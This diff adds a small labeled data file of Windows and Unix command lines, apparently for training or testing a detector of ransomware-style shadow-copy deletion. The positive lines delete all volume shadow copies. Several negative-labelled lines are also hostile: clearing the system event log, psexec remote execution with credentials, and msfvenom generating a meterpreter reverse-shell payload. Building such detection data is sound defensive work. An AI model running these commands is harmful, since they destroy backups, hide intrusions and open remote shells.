@@ -1,0 +1,16 @@
+1	cmd /c "vssadmin.exe delete shadows /All /Quiet"
+1	powershell -c "vssadmin.exe delete shadows /All /Quiet"
+1	vssadmin Delete Shadows /All /Quiet
+1	cmd /c "vssadmin Delete Shadows /All /Quiet"
+1	powershell -c "vssadmin Delete Shadows /All /Quiet"
+1	vssadmin.exe Delete Shadows /All /Quiet
+1	cmd /c "vssadmin.exe Delete Shadows /All /Quiet"
+1	powershell -c "vssadmin.exe Delete Shadows /All /Quiet"
+0	echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> &1
+0	cmd /c "choco install -f putty"
+0	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+0	rm -fr ${local_file_path} 2> /dev/null
+0	cmd /c "7z a -slp ${destination_file_path} ${source_file_path} -p${password}"
+0	cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+0	wevtutil.exe clear-log system
+0	msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
